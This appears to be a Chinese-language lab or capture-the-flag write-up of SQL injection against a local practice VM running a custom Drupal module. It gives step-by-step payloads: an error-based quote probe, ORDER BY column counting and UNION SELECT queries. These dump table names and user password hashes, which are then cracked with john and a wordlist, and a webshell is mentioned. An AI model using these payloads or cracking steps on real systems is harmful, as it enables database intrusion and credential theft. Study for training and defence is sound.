**建立基准**
```
http://192.168.186.129/?nid=1
```
	作为参考页面


**闭合探测确定注入存在 单引号报错探测法**

```
http://192.168.186.129/?nid=1'
```
	报错
		Error message
		PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1: SELECT title FROM node WHERE nid = 1'; Array ( ) in mypages_init() (line 6 of /var/www/html/sites/all/modules/mypages/mypages.module).
			**第 1 句：`Syntax error ... 1064 You have an error in your SQL syntax`**
				错误类型是**语法错误**。这意味着你的单引号不是被当成了普通字符（比如拿去搜索了），而是破坏了 SQL 本身的结构——数据库拿这条语句去解析，解析器在引号处"噎住了"。这是"注入存在"的直接证据：如果程序做了参数化查询，你输入什么都是数据，永远不可能让 SQL 语法出错。
			**第 2 句：`check the manual that corresponds to your MariaDB server version`**
				**数据库类型暴露了：MariaDB**。这决定了你后面所有 payload 的方言——注释符用 `--`/`#`、函数用 `database()`/`version()`、多语句堆叠可行性等，都按 MySQL 家族来。没有这句，你得用 `version()` 之类的方法另行探测 DBMS。
			**第 3 句：`near '' at line 1: SELECT title FROM node WHERE nid = 1'`**
				这是整条报错里最值钱的一句，**后端真实执行的 SQL 原文直接打印出来了**。对着它你能读出 5 个答案：
			**第 4 句：`line 6 of /var/www/html/sites/all/modules/mypages/mypages.module`**
				白送了两个信息：**Web 根目录绝对路径** `/var/www/html`（等会儿拿到 shell 或写 webshell 时定位目录用），以及问题出在自定义模块 `mypages` 里——说明这是靶机作者自己写的漏洞代码，Drupal 核心没准没洞，别浪费时间打 core。
				

**确定结果集列数**
```
http://192.168.186.129/?nid=1 order by 1
结果未报错，可以执行

http://192.168.186.129/?nid=1 order by 2
结果报错说明结果集只有一列
```

**确认回显位**
```
http://192.168.186.129/?nid=-1 union select 1
web页面显示1的位置即为回显位
```
	- `nid=-1`：故意给一个**不存在的值**，让前半段查询 `WHERE nid = -1` 查不到任何数据
	- `union`：把两个查询的结果**纵向合并**成一张表
	- `select 1`：你的查询，输出常量 `1`

**爆破当前库名**
```
http://192.168.186.129/?nid=-1 union select database()
```
	`database()`：MySQL 内置函数，返回**当前连接使用的数据库名**


**查看库内容**
```
http://192.168.186.129/?nid=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database()
```
	`information_schema.tables` MySQL 的**元数据库**（描述数据库自身结构的库），里面 `tables` 表记录着这台 MySQL 里**所有库的所有表**
	`table_schema` `tables` 表里的一个字段，表示"这张表属于哪个数据库"
	`table_name` 表的名字
	`where table_schema=database()` 过滤条件：只要当前这个库里的表
	`group_concat(...)` 聚合函数，把多行结果**拼成一行用逗号连接**。因为页面回显位只有 1 个，只能显示一行的内容，必须把 N 个表名压进一行

**获取用户名密码**
```
http://192.168.186.129/?nid=-1 union select group_concat(name,0x3a,pass) from `users`
```

**利用john解码**
```
建立密码文档
vim hash.txt

john --format=drupal7 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

查看密码
john hash.txt --show
```

